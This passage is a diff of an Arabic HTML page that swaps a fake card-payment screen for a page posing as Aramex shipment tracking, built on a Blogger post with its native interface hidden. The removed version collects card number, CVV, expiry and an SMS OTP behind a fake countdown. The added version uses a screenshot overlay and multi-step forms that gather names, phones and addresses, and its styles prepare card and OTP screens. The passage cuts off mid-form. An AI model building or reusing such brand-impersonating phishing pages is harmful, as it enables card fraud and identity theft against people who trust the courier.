@@ -1,791 +1,1552 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>بطاقة الدفع</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ارامكس - تتبع وشحن</title>
 
 <style>
-*,
-*::before,
-*::after {
-  box-sizing: border-box;
+/* ========== الأنماط العامة وإخفاء عناصر بلوجر ========== */
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,"Segoe UI",Tahoma,Arial,sans-serif}
+
+body{visibility:hidden !important;}
+
+#navbar-iframe,.blogger-gear,.ss,header,footer,.header,.footer,.post-header,.post-footer,.post-title,h1.post-title,.breadcrumbs,.sidebar,.sidebar-container,.widget-area,.footer-outer,.footer-inner,.blog-pager{display:none!important}
+
+html,body{margin:0!important;padding:0!important;background:#fff}
+body{overflow:hidden}
+
+body,.container,.content,.main,.post,.post-body{
+max-width:100%!important;
+width:100%!important;
+padding:0!important;
+margin:0!important
 }
 
-html {
-  -webkit-text-size-adjust: 100%;
-  text-size-adjust: 100%;
+#myAramexPage{
+position:fixed;
+inset:0;
+width:100%;
+background:#fff;
+visibility:visible !important;
+overflow-y:auto;
+overflow-x:hidden;
+z-index:9998;
 }
 
-body {
-  font-family: Arial, sans-serif;
-  background: #f5f5f5;
-  margin: 0;
-  padding: 0;
-  overflow-x: hidden;
+/* الشريط العلوي للصفحة الأولى */
+.topbar{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:56px;
+background:#fff;
+display:flex;
+align-items:center;
+justify-content:space-between;
+padding:0 14px;
+z-index:1000;
 }
 
-.payment-screen {
-  width: 100%;
-  padding: 14px 14px 12px;
+.logo{
+font-weight:900;
+font-size:24px;
+color:#d81e1e;
 }
 
-.page-shell {
-  width: 100%;
-  max-width: 430px;
-  margin: 0 auto;
+.login-btn{
+border:none;
+border-radius:999px;
+background:#d81e1e;
+color:#fff;
+padding:6px 16px;
+font-size:12px;
 }
 
-.apple-pay-screen {
+.menu-icon{
+display:flex;
+flex-direction:column;
+gap:5px;
+cursor:pointer;
+}
+
+.menu-icon span{
+width:26px;
+height:3px;
+background:#d81e1e;
+display:block;
+border-radius:2px;
+}
+
+.left-group{
+display:flex;
+align-items:center;
+gap:12px;
+}
+
+.fullpage{
+margin-top:20px;
+width:100vw;
+margin-right:calc(50% - 50vw);
+margin-left:calc(50% - 50vw);
+padding-bottom:0;
+}
+
+.image-wrap{
+position:relative;
+width:100vw;
+}
+
+.secure-img{
+width:100%;
+display:block;
+user-select:none;
+-webkit-user-drag:none;
+pointer-events:none;
+}
+
+.overlay{
+position:absolute;
+top:0;
+left:0;
+width:100%;
+height:100%;
+z-index:20;
+}
+
+.box1{
+position:absolute;
+top:360px;
+right:7%;
+width:70px;
+height:70px;
+background:transparent;
+border:none;
+cursor:pointer;
+z-index:30;
+}
+
+.track-input{
+position:absolute;
+top:380px;
+left:23%;
+width:40%;
+height:40px;
+z-index:30;
+}
+
+.track-input input{
+width:100%;
+height:100%;
+border:none;
+outline:none;
+text-align:center;
+font-size:14px;
+border-radius:8px;
+background:transparent !important;
+direction:ltr;
+box-shadow:none !important;
+-webkit-appearance:none;
+appearance:none;
+}
+
+.track-input input:focus{
+background:transparent !important;
+outline:none;
+box-shadow:none !important;
+}
+
+.track-input input:-webkit-autofill,
+.track-input input:-webkit-autofill:hover,
+.track-input input:-webkit-autofill:focus,
+.track-input input:-webkit-autofill:active{
+-webkit-box-shadow:0 0 0 1000px transparent inset !important;
+box-shadow:0 0 0 1000px transparent inset !important;
+-webkit-text-fill-color:#000 !important;
+background:transparent !important;
+transition:background-color 9999s ease-in-out 0s;
+}
+
+.box2{
+position:absolute;
+top:560px;
+left:5%;
+width:90%;
+height:260px;
+background:transparent;
+border-radius:10px;
+border:none;
+cursor:pointer;
+z-index:30;
+}
+
+.popup{
+position:fixed;
+inset:0;
+background:rgba(0,0,0,.35);
+display:none;
+align-items:center;
+justify-content:center;
+z-index:9999;
+padding:20px;
+visibility:visible !important;
+}
+
+.popup.show{display:flex}
+
+.popup-card{
+width:min(92vw,340px);
+background:#fff;
+border-radius:18px;
+padding:22px 18px 16px;
+text-align:center;
+}
+
+.popup-btn{
+border:none;
+background:#d81e1e;
+color:#fff;
+border-radius:12px;
+padding:10px 24px;
+font-size:15px;
+font-weight:700;
+cursor:pointer;
+margin-top:14px;
+}
+
+/* ========== الصفحة الثانية (واجهة الشحن) ========== */
+#secondPage{
+position:fixed;
+inset:0;
+background:#edeff3;  /* خلفية موحدة تمنع ظهور الصفحة الأولى */
+display:none;
+z-index:10000;
+visibility:visible !important;
+overflow-y:auto;
+}
+
+#secondPage.show{display:block}
+
+/* حاوية محتوى الشحن */
+.second-content{
+padding:0;
+background:#edeff3;
+min-height:100vh; /* لتمتد على الأقل ارتفاع الشاشة بالكامل */
+}
+
+/* ========== أنماط واجهة الشحن (مأخوذة من الكود الثاني) ========== */
+:root{
+  --red:#d61f1f;
+  --darkred:#7b1a1a;
+  --bg:#ffffff;
+  --soft:#f2f4f7;
+  --card:#ffffff;
+  --line:#e6e8ee;
+  --text:#222;
+  --muted:#777;
+  --shadow: 0 10px 26px rgba(0,0,0,.08);
+  --radius:22px;
+  --max: 420px;
+  --fieldBorder:#d7dbe3;
+  --fieldBg:#ffffff;
+}
+
+#secondPage .app{
+  max-width:var(--max);
+  margin:0 auto;
+  background:var(--bg);
+  position:relative;
+  overflow:auto;
+  -webkit-overflow-scrolling:touch;
+  min-height:100vh; /* لتمتد على الأقل ارتفاع الشاشة */
+  box-shadow:0 0 0 1px rgba(0,0,0,.04);
+}
+
+#secondPage .topbar{
+  background:#fff;
+  padding:12px 12px 10px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  gap:10px;
+  position:sticky;
+  top:0;
+  z-index:20;
+  border-bottom:1px solid #f0f0f0;
+  height:auto;
+  width:100%;
+}
+
+#secondPage .leftBox{display:flex;align-items:center;gap:10px}
+
+#secondPage .burger{
+  width:34px;height:34px;border:0;background:transparent;
+  display:grid;place-items:center;cursor:pointer;
+}
+#secondPage .burger span{width:22px;height:2px;background:var(--red);display:block;position:relative}
+#secondPage .burger span:before,#secondPage .burger span:after{
+  content:"";position:absolute;left:0;width:22px;height:2px;background:var(--red);
+}
+#secondPage .burger span:before{top:-7px}
+#secondPage .burger span:after{top:7px}
+
+#secondPage .login{
+  border:0;background:var(--red);color:#fff;
+  font-weight:900;padding:10px 14px;border-radius:999px;
+  cursor:pointer;box-shadow:0 10px 18px rgba(214,31,31,.18);
+}
+
+#secondPage .brand{font-weight:900;color:var(--red);font-size:30px;line-height:1;letter-spacing:-.5px}
+
+#secondPage .page{
+  display:none;
+  background:#fff;
+  min-height:calc(100vh - 60px); /* يضمن تغطية باقي الشاشة */
+}
+#secondPage .page.active{
+  display:flex;
+  flex-direction:column;
+}
+
+#secondPage .section{
+  padding:14px 14px 18px;
+  flex: 1 0 auto;
+}
+
+#secondPage .titleBig{
+  text-align:center;color:var(--red);
+  font-size:38px;font-weight:900;
+  margin:16px 0 10px;letter-spacing:-.6px;
+}
+#secondPage .formSub{text-align:center;font-size:18px;font-weight:800;color:#666;margin:0 0 16px}
+
+#secondPage .choiceGrid{display:grid;gap:14px;padding:10px 14px 20px}
+#secondPage .choice{
+  border:1px solid var(--line);
+  border-radius:16px;
+  box-shadow: var(--shadow);
+  background:#fff;
+  padding:18px;
+  text-align:center;
+  cursor:pointer;
+  position:relative;
+  user-select:none;
+  min-height:120px;
+}
+#secondPage .choice .emoji{font-size:42px;opacity:.9;margin-bottom:10px}
+#secondPage .choice .lbl{font-size:22px;font-weight:900;color:#666}
+
+#secondPage #page-where .choice[data-type="local"],
+#secondPage #page-where .choice[data-type="international"]{
+  background-size:100% 100%;
+  background-position:center top;
+  border:none;
+  box-shadow:none;
+  padding:0;
+  min-height:auto;
+  height:190px;
+}
+#secondPage #page-where .choice[data-type="local"]{
+  background-image:url("https://i.postimg.cc/c1zQsd2C/Screenshot-20251231-075235.jpg");
+}
+#secondPage #page-where .choice[data-type="international"]{
+  background-image:url("https://i.postimg.cc/sg4mft50/Screenshot-20251231-075255.jpg");
+}
+#secondPage #page-where .choice .emoji,
+#secondPage #page-where .choice .lbl{
+  display:none;
+}
+
+#secondPage .wizardTop{padding:10px 14px 0;background:#fff}
+#secondPage .steps{
+  display:flex;align-items:center;justify-content:space-between;
+  margin:10px 0 0;position:relative;padding:0 6px;
+}
+#secondPage .steps:before{
+  content:"";position:absolute;left:10px;right:10px;top:16px;height:4px;background:#e5e5e5;border-radius:99px;z-index:0;
+}
+#secondPage .step{position:relative;z-index:1;display:grid;justify-items:center;gap:6px;width:25%;color:#aaa;font-weight:900}
+#secondPage .bubble{
+  width:34px;height:34px;border-radius:50%;
+  background:#eee;display:grid;place-items:center;font-weight:900;color:#999;border:3px solid #eee;
+}
+#secondPage .step.active .bubble{background:#fff;border-color:var(--red);color:var(--red)}
+#secondPage .step.done .bubble{background:var(--red);border-color:var(--red);color:#fff}
+#secondPage .step span{font-size:14px;text-align:center;line-height:1.2}
+
+#secondPage .formTitle{text-align:center;font-size:26px;font-weight:900;margin:22px 0 6px;color:#333}
+
+#secondPage .fieldLine{padding:10px 0 16px;border-bottom:2px solid #e9e9e9;margin:0 14px}
+#secondPage .fieldLine label{display:block;font-weight:900;color:#444;margin-bottom:8px;font-size:18px}
+#secondPage .fieldLine input, #secondPage .fieldLine select{width:100%;border:0;outline:0;font-size:18px;font-weight:800;padding:6px 0;background:transparent}
+
+#secondPage .phoneRow{display:flex;align-items:center;justify-content:space-between;gap:10px}
+#secondPage .flag{
+  display:flex;
+  align-items:center;
+  gap:6px;
+  font-weight:900;
+  color:#111;
+  white-space:nowrap;
+  font-size:16px;
+}
+#secondPage .flag i{display:none;}
+#secondPage .flag span{display:inline-block;}
+
+#secondPage .btnRow{display:flex;gap:12px;padding:18px 14px 26px}
+#secondPage .btnMain{flex:1;border:0;background:var(--red);color:#fff;font-weight:900;font-size:18px;padding:14px 14px;border-radius:10px;cursor:pointer}
+#secondPage .btnGhost{flex:1;border:0;background:#ededed;color:#666;font-weight:900;font-size:18px;padding:14px 14px;border-radius:10px;cursor:pointer}
+
+#secondPage .choice.selectable .tick{
+  position:absolute;top:12px;inset-inline-end:12px;
+  width:30px;height:30px;border-radius:50%;
+  background:var(--red);color:#fff;display:grid;place-items:center;
+  font-weight:900;transform:scale(.9);opacity:0;transition:.15s ease;
+  box-shadow: 0 10px 18px rgba(214,31,31,.22);
+}
+#secondPage .choice.selected{border-color: rgba(214,31,31,.55);box-shadow: 0 12px 28px rgba(214,31,31,.12)}
+#secondPage .choice.selected .tick{opacity:1;transform:scale(1)}
+
+#secondPage .cardForm{padding:8px 14px 20px}
+#secondPage .grid2{display:grid;grid-template-columns: 1fr 1fr;gap:12px}
+
+#secondPage #page-cardform .fieldLine{margin:0 0 12px;padding:0;border-bottom:0}
+#secondPage #page-cardform .fieldLine label{margin-bottom:7px;font-size:16px;color:#333}
+#secondPage #page-cardform input, #secondPage #page-cardform select{
+  border:1px solid var(--fieldBorder);
+  background:var(--fieldBg);
+  border-radius:10px;
+  padding:12px 12px;
+  width:100%;
+  outline:none;
+  font-size:16px;
+  font-weight:800;
+  color:#222;
+  box-shadow: 0 4px 14px rgba(0,0,0,.04);
+  appearance:none;
+}
+
+#secondPage .card-type-options {
+  display: flex;
+  gap: 8px;
+  flex-wrap: nowrap;
+  margin-top: 8px;
+}
+#secondPage .card-type-option {
+  border: 2px solid var(--fieldBorder);
+  border-radius: 12px;
+  padding: 10px 8px;
+  font-weight: 800;
+  font-size: 16px;
+  color: #444;
+  background: #fff;
+  cursor: pointer;
+  transition: 0.2s;
+  flex: 1 1 0;
+  text-align: center;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+  white-space: nowrap;
+}
+#secondPage .card-type-option.selected {
+  border-color: var(--red);
+  background: #ffeeee;
+  color: var(--red);
+}
+
+#secondPage .noteBox{
+  margin:14px 0 0;border:1px solid #f0c2c2;border-inline-start:6px solid var(--red);
+  border-radius:14px;padding:14px 12px;color:#555;font-weight:800;line-height:1.8;background:#fff;box-shadow: var(--shadow);
+}
+
+#secondPage #page-cardform select{cursor:pointer}
+
+#secondPage .loadingPage{
+  min-height: calc(100vh - 60px);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  background:#fff;
+}
+#secondPage .spinnerRing{
+  width:220px;height:220px;border-radius:50%;
+  position:relative;
+  background: conic-gradient(var(--red) 0deg 70deg, #bfc6ce 70deg 360deg);
+  filter: drop-shadow(0 14px 26px rgba(0,0,0,.14));
+  animation: spin 1.2s linear infinite;
+  margin:0 auto;
+}
+#secondPage .spinnerRing::after{
+  content:"";
+  position:absolute;
+  inset:34px;
+  background:#fff;
+  border-radius:50%;
+  box-shadow: inset 0 0 0 2px rgba(0,0,0,.04);
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+#secondPage .loadingCountdown{
+  margin-top:16px;
+  text-align:center;
+  font-weight:900;
+  font-size:20px;
+  color:#333;
+  display:none;
+}
+
+#secondPage .otpWrap{padding:18px 14px 28px}
+#secondPage .otpTitle{text-align:center;font-weight:950;font-size:26px;color:#333;margin:18px 0 10px}
+#secondPage .otpSub{text-align:center;font-weight:800;color:#666;margin:0 0 18px;line-height:1.7;font-size:16px}
+#secondPage .otpBox{
+  border:1px solid var(--fieldBorder);
+  border-radius:16px;
+  box-shadow: var(--shadow);
+  padding:16px;
+  background:#fff;
+}
+#secondPage .otpBox label{display:block;font-weight:900;color:#333;margin-bottom:10px;font-size:16px}
+#secondPage .otpBox input{
+  width:100%;
+  border:1px solid var(--fieldBorder);
+  border-radius:12px;
+  padding:14px 12px;
+  font-size:20px;
+  font-weight:950;
+  text-align:center;
+  letter-spacing:6px;
+  outline:none;
+  box-shadow: 0 6px 18px rgba(0,0,0,.05);
+}
+
+#secondPage .error-msg{
+  color:#d61f1f;
+  font-size:13px;
+  margin-top:4px;
+  display:none;
+  font-weight:700;
+}
+
+/* ========== البوب أب المخصص للرسائل ========== */
+.custom-popup {
   position: fixed;
-  inset: 0;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
   background: #fff;
-  z-index: 99999;
+  border-radius: 20px;
+  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+  padding: 24px 28px;
+  max-width: 320px;
+  width: 90%;
+  z-index: 1000000;
+  text-align: center;
+  border: 1px solid #ffe0e0;
   display: none;
+  direction: rtl;
 }
-
-.apple-pay-btn {
-  width: 100%;
-  background: #000;
-  border-radius: 999px;
-  height: 70px;
-  margin: 8px auto 16px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  overflow: hidden;
-  cursor: pointer;
-  border: none;
-  outline: none;
-  padding: 0;
-  -webkit-tap-highlight-color: transparent;
-}
-
-.apple-wrap {
-  width: 175px;
-  height: 44px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  overflow: hidden;
-}
-
-.apple-logo {
-  width: 100%;
-  height: auto;
-  display: block;
-  object-fit: contain;
-  background: transparent !important;
-  border: none !important;
-  box-shadow: none !important;
-  pointer-events: none;
-  user-select: none;
-  -webkit-user-drag: none;
-  transform: scale(1.68) translateY(9px);
-  transform-origin: center center;
-}
-
-.box {
-  width: 100%;
-  border: 2px solid #000;
-  border-radius: 26px;
-  padding: 20px;
-  background: #fff;
-  overflow: hidden;
-}
-
-.title {
-  font-size: 22px;
-  font-weight: 700;
-  margin-bottom: 15px;
-}
-
-.input-box {
-  width: 100%;
-  background: #f2f2f2;
-  border-radius: 30px;
-  padding: 0 15px;
-  height: 52px;
-  margin-top: 15px;
-  display: flex;
-  align-items: center;
-  border: 1px solid transparent;
-  transition: border-color 0.2s ease, box-shadow 0.2s ease;
-  overflow: hidden;
-}
-
-.card-icon {
-  width: 65px;
-  height: auto;
-  margin-left: 10px;
-  background: transparent !important;
-  border: none !important;
-  box-shadow: none !important;
-  display: block;
-  flex-shrink: 0;
-}
-
-.card-number {
-  border: none;
-  outline: none;
-  background: transparent;
-  font-size: 16px;
-  width: 100%;
-  text-align: right;
-  color: #111;
-}
-
-.row {
-  display: flex;
-  width: 100%;
-  gap: 10px;
-  margin-top: 15px;
-}
-
-.small-input {
-  flex: 1;
-  min-width: 0;
-  border: 1px solid transparent;
-  outline: none;
-  background: #f2f2f2;
-  border-radius: 30px;
-  padding: 12px;
-  text-align: center;
-  font-size: 15px;
-  height: 48px;
-  transition: border-color 0.2s ease, box-shadow 0.2s ease;
-  color: #111;
-}
-
-.name-input {
-  border: 1px solid transparent;
-  outline: none;
-  background: #f2f2f2;
-  border-radius: 30px;
-  height: 52px;
-  padding: 0 14px;
-  width: 100%;
-  text-align: center;
-  font-size: 16px;
-  margin-top: 15px;
-  transition: border-color 0.2s ease, box-shadow 0.2s ease;
-  color: #111;
-}
-
-.expiry-box {
-  flex: 1;
-  min-width: 0;
-  background: #f2f2f2;
-  border-radius: 30px;
-  height: 48px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  border: 1px solid transparent;
-  transition: border-color 0.2s ease, box-shadow 0.2s ease;
-  overflow: hidden;
-  direction: ltr;
-}
-
-.expiry-select {
-  width: 44%;
-  border: none;
-  outline: none;
-  background: transparent;
-  font-size: 15px;
-  text-align: center;
-  text-align-last: center;
-  appearance: none;
-  -webkit-appearance: none;
-  -moz-appearance: none;
-  padding: 0;
-  color: #000;
-  cursor: pointer;
-}
-
-.expiry-sep {
-  width: 12%;
-  text-align: center;
-  font-size: 15px;
-  color: #555;
-  user-select: none;
-}
-
-.pay-btn {
-  width: 100%;
-  margin: 16px auto 0;
-  background: #2e9f44;
+.custom-popup .popup-icon {
+  width: 50px;
+  height: 50px;
+  background: #d81e1e;
   color: #fff;
-  border: none;
-  border-radius: 999px;
-  height: 70px;
-  font-size: 21px;
-  font-weight: 700;
-  cursor: pointer;
-  display: block;
-  -webkit-tap-highlight-color: transparent;
-}
-
-.error {
-  border-color: rgba(220, 38, 38, 0.45) !important;
-  box-shadow: 0 0 0 2px rgba(220, 38, 38, 0.08) !important;
-}
-
-input::placeholder {
-  color: #777;
-}
-
-select:invalid {
-  color: #777;
-}
-
-.flow-screen {
-  position: fixed;
-  inset: 0;
-  background: #fff;
-  z-index: 100000;
-  display: none;
+  border-radius: 50%;
+  display: flex;
   align-items: center;
   justify-content: center;
-  padding: 20px;
-}
-
-.flow-card {
-  width: 100%;
-  max-width: 420px;
-  text-align: center;
-}
-
-.loader-pro {
-  position: relative;
-  width: 124px;
-  height: 124px;
-  margin: 0 auto 22px;
-  border-radius: 50%;
-  background: conic-gradient(
-    from 210deg,
-    #0b78f2 0deg 58deg,
-    #b9dafb 58deg 360deg
-  );
-  animation: spinRing 1.15s linear infinite;
-}
-
-.loader-pro::before {
-  content: "";
-  position: absolute;
-  inset: 18px;
-  background: #fff;
-  border-radius: 50%;
-}
-
-.loader-pro::after {
-  content: "";
-  position: absolute;
-  inset: 0;
-  border-radius: 50%;
-  box-shadow:
-    0 0 0 1px rgba(11, 120, 242, 0.03),
-    0 8px 20px rgba(11, 120, 242, 0.08);
-}
-
-.countdown {
   font-size: 32px;
-  font-weight: 700;
-  color: #1d4ed8;
-  direction: ltr;
+  font-weight: 900;
+  margin: 0 auto 15px;
+  box-shadow: 0 8px 16px rgba(216,30,30,0.3);
 }
-
-.otp-desc {
-  font-size: 17px;
-  line-height: 2;
-  color: #111;
-  margin-bottom: 18px;
-}
-
-.otp-input {
-  width: 100%;
-  height: 52px;
-  border-radius: 30px;
-  border: 1px solid transparent;
-  background: #f2f2f2;
-  outline: none;
-  text-align: center;
+.custom-popup .popup-message {
   font-size: 18px;
-  padding: 0 16px;
-  transition: border-color 0.2s ease, box-shadow 0.2s ease;
+  font-weight: 800;
+  color: #333;
+  margin-bottom: 10px;
+  line-height: 1.6;
 }
-
-.otp-btn {
-  width: 100%;
-  margin-top: 15px;
-  background: #2e9f44;
-  color: #fff;
+.custom-popup .popup-close {
+  background: #f0f0f0;
   border: none;
-  border-radius: 40px;
-  height: 56px;
-  font-size: 20px;
+  padding: 10px 30px;
+  border-radius: 30px;
   font-weight: 700;
+  color: #666;
+  margin-top: 15px;
   cursor: pointer;
+  transition: 0.2s;
+  font-size: 16px;
 }
-
-input,
-select,
-button {
-  font-family: inherit;
-}
-
-@keyframes spinRing {
-  from { transform: rotate(0deg); }
-  to { transform: rotate(360deg); }
-}
-
-@media (max-width: 480px) {
-  .payment-screen { padding: 10px; }
-  .page-shell { max-width: 100%; }
-  .apple-pay-btn { height: 64px; margin-bottom: 14px; }
-  .apple-wrap { width: 150px; height: 38px; }
-  .apple-logo { transform: scale(1.60) translateY(8px); }
-  .box { padding: 16px; }
-  .title { font-size: 20px; }
-  .pay-btn { height: 64px; font-size: 19px; }
-}
-
-@media (min-width: 700px) {
-  body { display: flex; justify-content: center; }
-  .payment-screen { padding-top: 16px; padding-bottom: 10px; }
-  .page-shell { max-width: 440px; }
-  .apple-pay-btn { height: 72px; }
-  .apple-wrap { width: 190px; height: 46px; }
-  .apple-logo { transform: scale(1.76) translateY(9px); }
+.custom-popup .popup-close:hover {
+  background: #d81e1e;
+  color: #fff;
 }
 </style>
 </head>
 <body>
 
-<div class="payment-screen" id="paymentScreen">
-  <div class="page-shell">
-    <div class="apple-pay-screen" id="applePayScreen"></div>
-    <button class="apple-pay-btn" id="applePayBtn" type="button">
-      <div class="apple-wrap">
-        <img src="https://i.postimg.cc/zXgvbB4n/20260412-174304.png" class="apple-logo" alt="Apple Pay">
-      </div>
-    </button>
-    <div class="box">
-      <div class="title">بطاقة الائتمان</div>
-      <div class="input-box" id="cardBox">
-        <img id="cardLogo" class="card-icon" src="https://i.postimg.cc/Hsf6sDzk/20260412-152344.png" alt="card">
-        <input type="text" id="cardNumber" class="card-number" placeholder="رقم البطاقة" maxlength="16" inputmode="numeric" autocomplete="cc-number">
-      </div>
-      <div class="row">
-        <input type="text" id="cvv" class="small-input" placeholder="CVV" maxlength="3" inputmode="numeric" autocomplete="cc-csc">
-        <div class="expiry-box" id="expiryBox">
-          <select id="expMonth" class="expiry-select" required><option value="" selected disabled>MM</option></select>
-          <div class="expiry-sep">/</div>
-          <select id="expYear" class="expiry-select" required><option value="" selected disabled>YY</option></select>
-        </div>
-      </div>
-      <input type="text" id="cardName" class="name-input" placeholder="الاسم الموجود على البطاقة" autocomplete="cc-name">
-    </div>
-    <button class="pay-btn" id="payBtn" type="button">ادفع الآن</button>
-  </div>
+<!------------------ الصفحة الأولى (التتبع) ------------------>
+<div id="myAramexPage">
+
+<div class="topbar">
+<div class="logo">ارامكس</div>
+<div class="left-group">
+<button class="login-btn" type="button">تسجيل الدخول</button>
+<div class="menu-icon">
+<span></span><span></span><span></span>
+</div>
+</div>
 </div>
 
-<div class="flow-screen" id="loadingScreen1"><div class="flow-card"><div class="loader-pro"></div><div class="countdown" id="countdown60">60</div></div></div>
-<div class="flow-screen" id="otpScreen"><div class="flow-card"><div class="otp-desc">يرجى إدخال رمز التحقق (OTP) المرسلة عبر رسالة نصية قصيرة إلى هاتفك المحمول لتنفيذ المعاملة</div><input type="text" id="otpInput" class="otp-input" placeholder="أدخل رمز التحقق" inputmode="numeric" maxlength="6"><button class="otp-btn" id="otpBtn" type="button">تحقق</button></div></div>
-<div class="flow-screen" id="loadingScreen2"><div class="flow-card"><div class="loader-pro"></div></div></div>
+<div class="fullpage">
+<div class="image-wrap">
+<img src="https://files.catbox.moe/z0hfc0.png" class="secure-img">
+<div class="overlay">
+<button class="box1" id="checkBtn"></button>
+<div class="track-input">
+<input id="trackNumber" type="tel" inputmode="numeric" maxlength="10">
+</div>
+<button class="box2" id="openSecondPageBtn"></button>
+</div>
+</div>
+</div>
+</div>
+
+<div class="popup" id="popup">
+<div class="popup-card">
+<div id="popupMessage"></div>
+<button class="popup-btn" id="popupCloseBtn">حسناً</button>
+</div>
+</div>
+
+<!------------------ الصفحة الثانية (الشحن) ------------------>
+<div id="secondPage">
+<div class="second-content">
+<!-- محتوى واجهة الشحن بالكامل -->
+<div id="screen-ship">
+  <div id="appRoot">
+    <div class="app" id="app">
+      <!-- الشريط العلوي الأصلي لواجهة الشحن -->
+      <div class="topbar">
+        <div class="brand">ارامكس</div>
+        <div class="leftBox">
+          <button class="login" id="goLogin">تسجيل الدخول</button>
+          <button class="burger" id="openMenu" title="القائمة"><span></span></button>
+        </div>
+      </div>
+
+      <!-- صفحة "إلى أين؟" -->
+      <section class="page active" id="page-where">
+        <div class="section">
+          <div class="titleBig" style="font-size:42px; margin-top:8px">الى أين؟</div>
+          <div class="formSub" style="font-size:22px; margin-bottom:10px">هل ترسل؟</div>
+          <div class="choiceGrid">
+            <div class="choice" data-type="local" data-next="sender">
+              <div class="emoji">🚚</div><div class="lbl">شحنة محلية</div>
+            </div>
+            <div class="choice" data-type="international" data-next="sender">
+              <div class="emoji">✈️</div><div class="lbl">شحنة دولية</div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- SENDER -->
+      <section class="page" id="page-sender">
+        <div class="wizardTop">
+          <div class="steps">
+            <div class="step active"><div class="bubble">1</div><span>معلومات<br>المرسل</span></div>
+            <div class="step"><div class="bubble">2</div><span>معلومات<br>المستلم</span></div>
+            <div class="step"><div class="bubble">3</div><span>تفاصيل<br>الشحنة</span></div>
+            <div class="step"><div class="bubble">4</div><span>خيارات<br>الدفع</span></div>
+          </div>
+        </div>
+        <div class="section">
+          <div class="formTitle">يرجى تعبئة معلومات المرسل</div>
+          <div class="fieldLine">
+            <label>الاسم *</label>
+            <input id="s_name" />
+            <div class="error-msg" id="err_s_name"></div>
+          </div>
+          <div class="fieldLine">
+            <label>البلد *</label>
+            <select id="s_country">
+              <option value="sa" selected>المملكة العربية السعودية</option>
+              <option value="ae">الإمارات العربية المتحدة</option>
+              <option value="kw">الكويت</option>
+              <option value="bh">البحرين</option>
+              <option value="qa">قطر</option>
+              <option value="om">عمان</option>
+            </select>
+            <div class="error-msg" id="err_s_country"></div>
+          </div>
+          <div class="fieldLine">
+            <label>رقم الهاتف *</label>
+            <div class="phoneRow">
+              <input id="s_phone" placeholder="0512345678" />
+              <div class="flag" id="s_flag"><i></i> <span>+966</span></div>
+            </div>
+            <div class="error-msg" id="err_s_phone"></div>
+          </div>
+          <div class="fieldLine">
+            <label>المدينة *</label>
+            <input id="s_city" />
+            <div class="error-msg" id="err_s_city"></div>
+          </div>
+          <div class="fieldLine">
+            <label>الحي *</label>
+            <input id="s_district" />
+            <div class="error-msg" id="err_s_district"></div>
+          </div>
+          <div class="fieldLine">
+            <label>اسم الشارع *</label>
+            <input id="s_street" />
+            <div class="error-msg" id="err_s_street"></div>
+          </div>
+        </div>
+        <div class="btnRow">
+          <button class="btnMain" id="btnNextSender">التالي</button>
+          <button class="btnGhost" data-back="where">رجوع</button>
+        </div>
+      </section>
+
+      <!-- RECEIVER -->
+      <section class="page" id="page-receiver">
+        <div class="wizardTop">
+          <div class="steps">
+            <div class="step done"><div class="bubble">✓</div><span>معلومات<br>المرسل</span></div>
+            <div class="step active"><div class="bubble">2</div><span>معلومات<br>المستلم</span></div>
+            <div class="step"><div class="bubble">3</div><span>تفاصيل<br>الشحنة</span></div>
+            <div class="step"><div class="bubble">4</div><span>خيارات<br>الدفع</span></div>
+          </div>
+        </div>
+        <div class="section">
+          <div class="formTitle">يرجى تعبئة معلومات المستلم</div>
+          <div class="fieldLine">
+            <label>الاسم *</label>
+            <input id="r_name" />
+            <div class="error-msg" id="err_r_name"></div>
+          </div>
+          <div class="fieldLine">
+            <label>البلد *</label>
+            <select id="r_country">
+              <option value="sa" selected>المملكة العربية السعودية</option>
+              <option value="ae">الإمارات العربية المتحدة</option>
+              <option value="kw">الكويت</option>
+              <option value="bh">البحرين</option>
+              <option value="qa">قطر</option>
+              <option value="om">عمان</option>
+            </select>
+            <div class="error-msg" id="err_r_country"></div>
+          </div>
+          <div class="fieldLine">
+            <label>رقم الهاتف *</label>
+            <div class="phoneRow">
+              <input id="r_phone" placeholder="0512345678" />
+              <div class="flag" id="r_flag"><i></i> <span>+966</span></div>
+            </div>
+            <div class="error-msg" id="err_r_phone"></div>
+          </div>
+          <div class="fieldLine">
+            <label>المدينة *</label>
+            <input id="r_city" />
+            <div class="error-msg" id="err_r_city"></div>
+          </div>
+          <div class="fieldLine">
+            <label>الحي *</label>
+            <input id="r_district" />
+            <div class="error-msg" id="err_r_district"></div>
+          </div>
+          <div class="fieldLine">
+            <label>اسم الشارع *</label>
+            <input id="r_street" />
+            <div class="error-msg" id="err_r_street"></div>
+          </div>
+        </div>
+        <div class="btnRow">
+          <button class="btnMain" id="btnNextReceiver">التالي</button>
+          <button class="btnGhost" data-back="sender">رجوع</button>
+        </div>
+      </section>
+
+      <!-- DETAILS -->
+      <section class="page" id="page-details">
+        <div class="wizardTop">
+          <div class="steps">
+            <div class="step done"><div class="bubble">✓</div><span>معلومات<br>المرسل</span></div>
+            <div class="step done"><div class="bubble">✓</div><span>معلومات<br>المستلم</span></div>
+            <div class="step active"><div class="bubble">3</div><span>تفاصيل<br>الشحنة</span></div>
+            <div class="step"><div class="bubble">4</div><span>خيارات<br>الدفع</span></div>
+          </div>
+        </div>
+        <div class="section">
+          <div class="fieldLine">
+            <label>رقم الشحنة *</label>
+            <input id="d_shipno" inputmode="numeric" />
+            <div class="error-msg" id="err_d_shipno"></div>
+          </div>
+          <div class="fieldLine">
+            <label>محتويات الشحنة *</label>
+            <input id="d_content" />
+            <div class="error-msg" id="err_d_content"></div>
+          </div>
+          <div class="fieldLine">
+            <label>عدد القطع *</label>
